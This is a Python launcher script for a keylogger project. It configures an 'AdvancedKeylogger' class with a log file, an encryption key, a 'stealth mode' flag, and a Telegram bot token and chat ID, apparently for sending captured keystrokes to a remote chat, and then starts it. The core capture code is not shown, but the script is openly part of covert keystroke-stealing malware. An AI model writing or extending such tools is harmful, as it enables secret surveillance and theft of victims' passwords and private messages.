import os
from dotenv import load_dotenv
from keylogger.core import AdvancedKeylogger

def main():
    print("\033[1;33m[*]\033[0m Initializing advanced keylogger...")
    load_dotenv()

    logger = AdvancedKeylogger(
        filename=os.getenv("LOG_FILE", "keylog.txt"),
        telegram_token=os.getenv("TELEGRAM_TOKEN"),
        telegram_chat_id=os.getenv("TELEGRAM_CHAT_ID"),
        encryption_key=os.getenv("ENCRYPTION_KEY"),
        stealth_mode=os.getenv("STEALTH_MODE", "False").lower() == "true"
    )

    try:
        logger.start()
    except KeyboardInterrupt:
        print("\n\033[1;31m[!]\033[0m Keylogger interrupted by user (Ctrl+C)")
        logger.print_footer()

if __name__ == "__main__":
    main()